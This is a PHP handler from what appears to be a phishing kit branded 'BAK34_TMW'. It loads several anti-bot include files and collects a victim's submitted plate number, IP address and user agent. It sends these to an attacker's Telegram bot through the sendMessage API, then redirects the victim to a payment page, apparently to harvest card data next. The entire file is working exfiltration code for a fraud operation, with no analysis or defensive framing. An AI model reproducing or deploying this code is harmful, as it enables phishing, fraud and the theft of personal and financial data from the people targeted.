<?php

/*

██████╗  █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ https://t.me/BAK34_TMW
                                                                                              
*/

include "../anti/anti1.php";
include "../anti/anti2.php";
include "../anti/anti3.php";
include "../anti/anti4.php";
include "../anti/anti5.php";
include "../anti/anti6.php";
include "../anti/anti7.php";


include '../bak3r.php';

$messages = "ㅤㅤㅤ[🔥] 𝕭𝖗𝖔𝖇𝖎𝖟𝖟 𝕭𝖞 @BAK34_TMW [🔥]ㅤㅤㅤㅤ\n\n";
$messages .= "💌𝓟𝖑𝖆𝖙𝖊: ".$_POST['plate']."\n";
$messages .= "🗑𝓐𝓭𝓻𝓮𝓼𝓼𝓮 𝓘𝓟 : ".$_SERVER['REMOTE_ADDR']."\n🛒𝑼𝒔𝒆𝒓 𝑨𝒈𝒆𝒏𝒕 : ".$_SERVER['HTTP_USER_AGENT']."";



$data = array(
    'chat_id' => $chatid, 
    'text' => $messages
);

$options = array(
    'http' => array(
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    )
);

$context = stream_context_create($options);
$result = file_get_contents("https://api.telegram.org/bot$token/sendMessage", false, $context);


header("Location: ../payment.php");
?>
